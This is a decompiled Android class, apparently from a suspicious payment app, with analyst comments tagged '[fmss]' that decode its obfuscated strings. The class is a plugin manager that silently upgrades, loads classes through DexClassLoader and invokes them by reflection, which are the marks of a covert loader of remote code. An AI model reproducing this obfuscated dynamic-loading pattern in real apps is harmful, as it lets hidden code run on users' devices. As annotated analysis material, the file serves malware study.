package com.payment.plus.sk.abcdef.jczdf.b;

import android.content.Context;
import android.os.Handler;
import android.util.Log;
import com.payment.plus.sk.abcdef.jczdf.b.a.a;
import com.payment.plus.sk.abcdef.jczdf.c.l;
import com.payment.plus.sk.abcdef.jczdf.c.m;
import com.payment.plus.sk.abcdef.jczdf.intf.Config;
import com.payment.plus.sk.abcdef.jczdf.intf.StatService;
import dalvik.system.DexClassLoader;
import java.util.HashMap;
import java.util.Map;
/* loaded from: classes.dex */
public final class b {
    private static b d;

    /* renamed from: a  reason: collision with root package name */
    private Context f985a;
    private Handler b;
    private HashMap<String, Object> c;
    private a e = a.a();
    private a f;

    private b() {
    }

    public static b a() {
        if (d == null) {
            d = new b();
        }
        return d;
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public static /* synthetic */ void a(b bVar) {
        l.a(com.payment.plus.sk.abcdef.jczdf.a.a("Y19GVFpdflJdUlRWQRNHQUp/XFJXY19GVFpdel5DXxI="));
        if (bVar.f != null) {
            l.c(com.payment.plus.sk.abcdef.jczdf.a.a("Y19GVFpdflJdUlRWQRNaQBNGQ1RBUldaXVQTXVxE"));
        } else if (bVar.e.b()) {
            l.a(com.payment.plus.sk.abcdef.jczdf.a.a("Q19GVFpdE1pAE1JfQVZSV0oTX1xSV1ZXE1FWVVxBVhI="));
        } else if (!bVar.e()) {
            bVar.d();
        }
    }

    public static DexClassLoader b() {
        return a.a().d();
    }

    private void d() {
        //[fmss] "upgrade!"
        l.a(com.payment.plus.sk.abcdef.jczdf.a.a("RkNUQVJXVhI="));
        if (this.f != null) {
            //[fmss] "PluginManager is upgrading now"
            l.c(com.payment.plus.sk.abcdef.jczdf.a.a("Y19GVFpdflJdUlRWQRNaQBNGQ1RBUldaXVQTXVxE"));
            return;
        }
        this.f = new a(this.f985a);
        this.f.a(new d(this));
    }

    /* JADX INFO: Access modifiers changed from: private */
    public boolean e() {
        this.e.c();
        boolean b = this.e.b();
        if (b) {
            Context context = this.f985a;
            HashMap<String, Object> hashMap = this.c;
            l.a(com.payment.plus.sk.abcdef.jczdf.a.a("fnJDQ19aUFJHWlxdE0lebFxdYEdSQUcS"));
            hashMap.put(Config.KEY_SHELL_PLUG_PATH, com.payment.plus.sk.abcdef.jczdf.a.a.a().c());
            hashMap.put(Config.KEY_SHELL_PLUG_PKG_NAME, com.payment.plus.sk.abcdef.jczdf.a.a.a().e());
            hashMap.put(Config.KEY_MINISDK_VER, Integer.valueOf((int) StatService.SDKVersion));
            hashMap.put(Config.KEY_ZPLUGIN_VER, Integer.valueOf(m.a(this.f985a, com.payment.plus.sk.abcdef.jczdf.a.a.a().c())));
            Class<?> a2 = this.e.a(com.payment.plus.sk.abcdef.jczdf.d.a.b);
            try {
                a2.getDeclaredMethod(com.payment.plus.sk.abcdef.jczdf.a.a("Wl1aR3JDQw=="), Context.class, Map.class).invoke(a2.getMethod(com.payment.plus.sk.abcdef.jczdf.a.a("VFZHel1AR1JdUFY="), new Class[0]).invoke(a2, new Object[0]), context, hashMap);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        l.a(com.payment.plus.sk.abcdef.jczdf.a.a("X1xSV3JdV3pdWkdjX0ZUWl0fE0FWRwk=") + b);
        return b;
    }

    public final Class<?> a(String str) {
        //[fmss] "PluginManager loadClass, className:"
        l.a(com.payment.plus.sk.abcdef.jczdf.a.a("Y19GVFpdflJdUlRWQRNfXFJXcF9SQEAfE1BfUkBAfVJeVgk=") + str);
        if (this.e.b()) {
            return this.e.a(str);
        }
        return null;
    }

    //[fmss] This method starts a pluginManager that will install new Plugins
    public final void a(Context context, HashMap<String, Object> hashMap) {
        //[fmss] "PluginManager init!"
        l.a(com.payment.plus.sk.abcdef.jczdf.a.a("Y19GVFpdflJdUlRWQRNaXVpHEg=="));
        this.f985a = context;
        this.c = hashMap;
        this.b = new Handler(this.f985a.getMainLooper());
        this.e.a(this.f985a);
        d();
    }

    public final void c() {
        if (this.b == null) {
            Log.e("", com.payment.plus.sk.abcdef.jczdf.a.a("XntSXVdfVkETWkATXUZfXxMfE0BXWBt+ckNDX1pQUkdaXF0aE11cE1pdWkc="));
            return;
        }
        l.a(com.payment.plus.sk.abcdef.jczdf.a.a("Y19GVFpdflJdUlRWQRNHQUp/XFJXY19GVFpdCQ=="));
        this.b.post(new c(this));
    }
}
